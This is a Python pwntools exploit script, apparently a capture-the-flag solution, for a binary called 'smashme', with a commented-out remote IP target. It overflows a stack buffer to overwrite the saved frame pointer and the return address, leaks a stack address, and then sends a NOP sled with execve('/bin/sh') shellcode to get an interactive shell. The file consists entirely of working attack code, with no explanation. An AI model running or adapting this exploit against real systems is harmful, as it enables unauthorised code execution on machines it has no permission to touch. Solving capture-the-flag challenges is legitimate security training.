from pwn import *

p = process('./smashme')
#p = remote('54.255.243.135', 57348)

print p.recvuntil('smash?')

t = 'Smash me outside, how bout dAAAAAAAAAAA'
t += 'A'*(0x40- len(t))
t += p64(0x6C9030 + 0x40) # rbp
t += p64(0x4009c2)
# t += p64(0x41414141)
p.sendline(t)

open('input', 'wb').write(t)

print p.recvline()
d = p.recvline()
print d

import binascii
d = d[8:]
print binascii.hexlify(d)
d = d[:8]
stack = u64(d)
print hex(stack)


# raw_input('attach')

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

target = 0x6c90d0

t = p64(target)
t += 'Smash me outside, how bout dAAAAAAAAAAA'
t += 'A'*(0x40- len(t))
t += p64(0x42424242) # rbp

t += p64(target)
t += '\x90'*0x100
t += sc
p.sendline(t)

p.interactive()
